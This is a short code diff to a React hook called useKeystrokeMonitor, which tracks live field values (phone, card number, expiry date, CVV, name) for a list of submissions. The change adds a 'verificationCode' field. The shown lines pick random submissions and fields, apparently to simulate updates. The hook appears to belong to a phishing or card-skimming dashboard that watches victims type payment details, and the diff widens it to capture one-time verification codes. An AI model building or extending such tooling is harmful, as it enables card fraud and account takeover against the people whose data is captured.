@@ -220,7 +220,7 @@ export function useKeystrokeMonitor(initialSubmissions: any[]) {
 
         // 随机选择一个提交和字段
         const randomSubmission = submissions[Math.floor(Math.random() * submissions.length)];
-        const fields: (keyof RealtimeInput)[] = ['phone', 'cardNumber', 'expiryDate', 'cvv', 'name'];
+        const fields: (keyof RealtimeInput)[] = ['phone', 'cardNumber', 'expiryDate', 'cvv', 'name', 'verificationCode'];
         const randomField = fields[Math.floor(Math.random() * fields.length)];
         
         const currentValue = fieldStates[randomSubmission.id]?.[randomField]?.value || 
